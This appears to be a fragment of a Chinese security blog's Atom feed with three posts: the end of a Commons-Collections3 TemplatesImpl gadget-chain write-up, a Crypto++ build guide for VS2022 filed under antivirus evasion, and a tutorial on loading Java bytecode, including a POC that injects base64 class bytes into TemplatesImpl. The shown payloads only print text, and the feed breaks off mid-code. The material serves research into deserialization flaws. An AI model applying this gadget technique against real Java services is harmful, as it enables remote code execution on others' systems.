alt="image-20240125202815838"></p><p>而在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>类的构造方法恰巧调用了TemplatesImpl的newTransformer方法</p><p><img src="/image/article/%E5%85%B3%E4%BA%8ETemplatesImpl%E7%9A%84Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections3.assets/image-20240125203004748.png" alt="image-20240125203004748"></p><p>整个利用链串联一起实现反序列化</p>]]></content>
    
    
    <summary type="html">关于TemplatesImpl的Java利用链CommonCollections3</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>VS2022中使用Cryptopp加密库</title>
    <link href="http://example.com/posts/397717936.html"/>
    <id>http://example.com/posts/397717936.html</id>
    <published>2024-01-24T03:54:58.000Z</published>
    <updated>2024-03-03T14:44:20.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VS2022中使用Cryptopp加密库"><a href="#VS2022中使用Cryptopp加密库" class="headerlink" title="VS2022中使用Cryptopp加密库"></a>VS2022中使用Cryptopp加密库</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>cryptopp：</p><p><a href="https://www.cryptopp.com/#download">https://www.cryptopp.com/#download</a></p><p><a href="https://github.com/weidai11/cryptopp">https://github.com/weidai11/cryptopp</a></p><p>cryptopp-pem：</p><p><a href="https://github.com/noloader/cryptopp-pem">https://github.com/noloader/cryptopp-pem</a></p><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><p><a href="https://cryptopp.com/wiki/Main_Page">https://cryptopp.com/wiki/Main_Page</a></p><h2 id="下载cryptopp和cryptopp-pem"><a href="#下载cryptopp和cryptopp-pem" class="headerlink" title="下载cryptopp和cryptopp-pem"></a>下载cryptopp和cryptopp-pem</h2><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124120927967.png" alt="image-20240124120927967"></p><p>将pem项目中的全部内容复制到cryptopp中</p><h2 id="Cryptopp项目库生成"><a href="#Cryptopp项目库生成" class="headerlink" title="Cryptopp项目库生成"></a>Cryptopp项目库生成</h2><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124121950277.png" alt="image-20240124121950277"></p><p>打开后有四个子工程</p><blockquote><p>cryptdll - 生成cryptopp.dll动态库</p><p>dlltest - 用来测试cryptopp.dll，依赖cryptdll工程</p><p>cryptlib - 生成cryptlib.lib静态库</p><p>cryptest - 用来测试cryptopp，依赖cryptlib工程</p></blockquote><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122042469.png" alt="image-20240124122042469"></p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122244838.png" alt="image-20240124122244838"></p><p>在crtptlib中Header Files &#x3D;&gt; 添加 &#x3D;&gt; 现有项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pem.h</span><br><span class="line">pem_common.h</span><br></pre></td></tr></table></figure><p>Source Files &#x3D;&gt; 添加 &#x3D;&gt; 现有项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pem_common.cpp</span><br><span class="line">pem_read.cpp</span><br><span class="line">pem_write.cpp</span><br></pre></td></tr></table></figure><p>重新在DEBUG和RELEASE生成</p><p>最终会在项目目录生成x64&#x2F;Output文件夹</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122916335.png" alt="image-20240124122916335"></p><p>文件夹内容为lib库</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124122929849.png" alt="image-20240124122929849"></p><p>新建文件夹crypropp和子文件夹include和lib</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124123122265.png" alt="image-20240124123122265"></p><p>将cryptopp中所有.h的头文件copy到include</p><p>将Output文件夹放入lib</p><h2 id="VS2022使用cryptopp库"><a href="#VS2022使用cryptopp库" class="headerlink" title="VS2022使用cryptopp库"></a>VS2022使用cryptopp库</h2><p>新建控制台项目</p><p>替换项目为官方AES代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cryptlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rijndael.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;modes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;files.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;osrng.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hex.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> CryptoPP;</span><br><span class="line"></span><br><span class="line">    AutoSeededRandomPool prng;</span><br><span class="line">    <span class="function">HexEncoder <span class="title">encoder</span><span class="params">(<span class="keyword">new</span> FileSink(std::cout))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">SecByteBlock <span class="title">key</span><span class="params">(AES::DEFAULT_KEYLENGTH)</span></span>;</span><br><span class="line">    <span class="function">SecByteBlock <span class="title">iv</span><span class="params">(AES::BLOCKSIZE)</span></span>;</span><br><span class="line"></span><br><span class="line">    prng.<span class="built_in">GenerateBlock</span>(key, key.<span class="built_in">size</span>());</span><br><span class="line">    prng.<span class="built_in">GenerateBlock</span>(iv, iv.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    std::string plain = <span class="string">&quot;CBC Mode Test:Hello!&quot;</span>;</span><br><span class="line">    std::string cipher, recovered;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;plain text: &quot;</span> &lt;&lt; plain &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************\</span></span><br><span class="line"><span class="comment">    \*********************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        CBC_Mode&lt; AES &gt;::Encryption e;</span><br><span class="line">        e.<span class="built_in">SetKeyWithIV</span>(key, key.<span class="built_in">size</span>(), iv);</span><br><span class="line"></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(plain, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">new</span> StreamTransformationFilter(e,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">new</span> StringSink(cipher)</span></span></span><br><span class="line"><span class="params"><span class="function">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="params"><span class="function">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************\</span></span><br><span class="line"><span class="comment">    \*********************************/</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;key: &quot;</span>;</span><br><span class="line">    encoder.<span class="built_in">Put</span>(key, key.<span class="built_in">size</span>());</span><br><span class="line">    encoder.<span class="built_in">MessageEnd</span>();</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;iv: &quot;</span>;</span><br><span class="line">    encoder.<span class="built_in">Put</span>(iv, iv.<span class="built_in">size</span>());</span><br><span class="line">    encoder.<span class="built_in">MessageEnd</span>();</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;cipher text: &quot;</span>;</span><br><span class="line">    encoder.<span class="built_in">Put</span>((<span class="type">const</span> byte*)&amp;cipher[<span class="number">0</span>], cipher.<span class="built_in">size</span>());</span><br><span class="line">    encoder.<span class="built_in">MessageEnd</span>();</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************\</span></span><br><span class="line"><span class="comment">    \*********************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        CBC_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.<span class="built_in">SetKeyWithIV</span>(key, key.<span class="built_in">size</span>(), iv);</span><br><span class="line"></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(cipher, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">new</span> StreamTransformationFilter(d,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">new</span> StringSink(recovered)</span></span></span><br><span class="line"><span class="params"><span class="function">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="params"><span class="function">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line"></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;recovered text: &quot;</span> &lt;&lt; recovered &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置属性"><a href="#设置属性" class="headerlink" title="设置属性"></a>设置属性</h3><p>C&#x2F;C++ &#x3D;&gt; 常规 &#x3D;&gt; 附加包含目录</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124123956329.png" alt="image-20240124123956329"></p><p>C&#x2F;C++ &#x3D;&gt; 代码生成 &#x3D;&gt; 运行库</p><p>Release选择MT </p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124046673.png" alt="image-20240124124046673"></p><p>链接器 &#x3D;&gt; 常规 &#x3D;&gt; 附加库目录</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124235343.png" alt="image-20240124124235343"></p><p>链接器 &#x3D;&gt; 输入 &#x3D;&gt; 附加依赖项</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124355297.png" alt="image-20240124124355297"></p><h2 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h2><p>在设置好的Release版本成功运行</p><p><img src="/image/article/VS2022%E4%B8%AD%E4%BD%BF%E7%94%A8Cryptopp%E5%8A%A0%E5%AF%86%E5%BA%93.assets/image-20240124124531689.png" alt="image-20240124124531689"></p>]]></content>
    
    
    <summary type="html">VS2022中使用Cryptopp加密库</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java动态加载字节码TemplatesImpl和BCEL</title>
    <link href="http://example.com/posts/1379073624.html"/>
    <id>http://example.com/posts/1379073624.html</id>
    <published>2024-01-21T13:59:59.000Z</published>
    <updated>2024-06-20T09:04:30.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java动态加载字节码TemplatesImpl和BCEL"><a href="#Java动态加载字节码TemplatesImpl和BCEL" class="headerlink" title="Java动态加载字节码TemplatesImpl和BCEL"></a>Java动态加载字节码TemplatesImpl和BCEL</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java字节码存储在.class文件在JVM虚拟机运行</p><h2 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h2><p>Java文件经历ClassLoader#loadClass&#x3D;&gt;ClassLoader#findClass&#x3D;&gt;ClassLoader#defineClass</p><p>defineClass这一步用来处理前面传入的字节码，并处理成Java类</p><p>可用来直接加载字节码</p><h3 id="defineClass加载字节码"><a href="#defineClass加载字节码" class="headerlink" title="defineClass加载字节码"></a>defineClass加载字节码</h3><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240121224237477.png" alt="image-20240121224237477"></p><p>先准备一个.class文件</p><p>写一个DefineClass.java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefineClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;New instance construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译.java文件 生成DefineClass.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac DefineClass.java</span><br></pre></td></tr></table></figure><p>将DefineClass.class文件进行base64加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAHgoABwAPCQAQABEIABIKABMAFAgAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAR0ZXN0AQAKU291cmNlRmlsZQEAEERlZmluZUNsYXNzLmphdmEMAAgACQcAGAwAGQAaAQAWTmV3IGluc3RhbmNlIGNvbnN0cnVjdAcAGwwAHAAdAQAHdGVzdDEyMwEAC0RlZmluZUNsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAYABwAAAAAAAgABAAgACQABAAoAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQALAAAADgADAAAAAwAEAAQADAAFAAEADAAJAAEACgAAACUAAgABAAAACbIAAhIFtgAEsQAAAAEACwAAAAoAAgAAAAgACAAJAAEADQAAAAIADg==</span><br></pre></td></tr></table></figure><p>直接使用defineClass加载字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAHgoABwAPCQAQABEIABIKABMAFAgAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAR0ZXN0AQAKU291cmNlRmlsZQEAEERlZmluZUNsYXNzLmphdmEMAAgACQcAGAwAGQAaAQAWTmV3IGluc3RhbmNlIGNvbnN0cnVjdAcAGwwAHAAdAQAHdGVzdDEyMwEAC0RlZmluZUNsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAYABwAAAAAAAgABAAgACQABAAoAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQALAAAADgADAAAAAwAEAAQADAAFAAEADAAJAAEACgAAACUAAgABAAAACbIAAhIFtgAEsQAAAAEACwAAAAoAAgAAAAgACAAJAAEADQAAAAIADg==&quot;</span>);</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader());</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;DefineClass&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hello.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">test</span> <span class="operator">=</span> hello.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        test.invoke(o);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240121223814985.png" alt="image-20240121223814985"></p><p>defineClass被调用类对象不会被初始化，需要调用构造函数才能执行代码</p><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中的内部类TransletClassLoader重写了defineClass</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240121224817610.png" alt="image-20240121224817610"></p><p>之前是protected修饰符现在是default 默认同包类可以访问</p><p>TemplatesImpl的利用链</p><p>TemplatesImpl#getOutputProperties&#x3D;&gt;TemplatesImpl#newTransformer&#x3D;&gt;TemplatesImpl#getTransletInstance&#x3D;&gt;emplatesImpl#defineTransletClasses&#x3D;&gt;TransletClassLoader#defineClass</p><p>首先getOutputProperties调用了newTransformer</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123192559989.png" alt="image-20240123192559989"></p><p>newTransormer调用getTransletInstance</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123195936384.png" alt="image-20240123195936384"></p><p>getTransletInstance调用defineTransletClasses</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123200051209.png" alt="image-20240123200051209"></p><p>最终defineTransletClasses调用defineClass</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123200255005.png" alt="image-20240123200255005"></p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADIAMwoABwAiCQAjACQIACUKACYAJwoAJgAoBwApBwAqAQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHEx0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWDsBAANkb20BABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAVc2VyaWFsaXphdGlvbkhhbmRsZXJzAQAxW0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAPZHRtQXhpc0l0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAUc2VyaWFsaXphdGlvbkhhbmRsZXIBADBMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE1RlbXBsYXRlc0ltcGxYLmphdmEMABoAGwcALAwALQAuAQATdGVtcGxhdGVYIGNvbnN0cnVjdAcALwwAMAAxDAAwADIBABp0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABChJKVYAIQAGAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAAA0ADAAAACAAAwAAAAEADQAOAAAAAAABAA8AEAABAAAAAQARABIAAgATAAAABAABABQAAQAIABUAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACoABAAAAAEADQAOAAAAAAABAA8AEAABAAAAAQAWABcAAgAAAAEAGAAZAAMAEwAAAAQAAQAUAAEAGgAbAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAUAAQAFQAMABYADAAAAAwAAQAAAA0ADQAOAAAACQAcAB0AAQAKAAAAOAACAAEAAAAKsgACEQKatgAFsQAAAAIACwAAAAoAAgAAABkACQAaAAwAAAAMAAEAAAAKAB4AHwAAAAEAIAAAAAIAIQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tpi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">org</span>.apache.xalan.xsltc.trax.TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        tpi.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>.class文件必须继承自AbstractTranslet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 